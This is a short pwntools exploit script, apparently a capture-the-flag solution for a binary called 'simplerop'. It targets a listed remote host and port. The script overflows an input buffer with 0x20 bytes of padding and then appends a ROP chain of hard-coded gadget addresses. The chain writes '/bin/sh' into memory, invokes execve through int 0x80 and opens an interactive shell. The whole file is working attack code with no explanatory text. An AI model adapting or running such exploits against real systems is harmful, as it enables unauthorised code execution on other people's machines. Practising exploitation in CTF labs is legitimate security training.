#!/usr/bin/python3

from pwn import *
import sys

# change those
BINARY = './simplerop'
LIBC = ''
HOST = '140.110.112.77'
PORT = 2126 

context.binary = BINARY
e = ELF( BINARY )
libc = ''

if len(sys.argv) > 1:
    r = remote( HOST, PORT )
    if LIBC != '':
        libc = ELF( LIBC )
else: 
    r = process( BINARY )
    if LIBC != '':
        libc = ELF( '/lib/x86_64-linux-gnu/libc.so.6' )
int80 = 0x080493e1
pop_eax_ret = 0x080bae06
pop_ebx_ret = 0x080481c9
pop_edx_pop_ecx_pop_ebx_ret = 0x0806e850
pop_edx_ret = 0x0806e82a
mov_dword_ptr_edx_add_0x18_eax_ret = 0x0804dc82
binsh = 0x80eb0d0

ROP = flat(
    pop_edx_ret,
    binsh - 0x18,
    pop_eax_ret,
    b"/bin",
    mov_dword_ptr_edx_add_0x18_eax_ret,
    
    pop_edx_ret,
    binsh - 0x14,
    pop_eax_ret,
    b"/sh\x00",
    mov_dword_ptr_edx_add_0x18_eax_ret,

    pop_eax_ret,
    0xb,
    pop_edx_pop_ecx_pop_ebx_ret,
    0,
    0,
    binsh,
    int80
)
input()
r.sendafter('Your input ', b'A'*0x20 + ROP)
#r.sendline('cat /home/`whoami`/flag')
r.interactive()
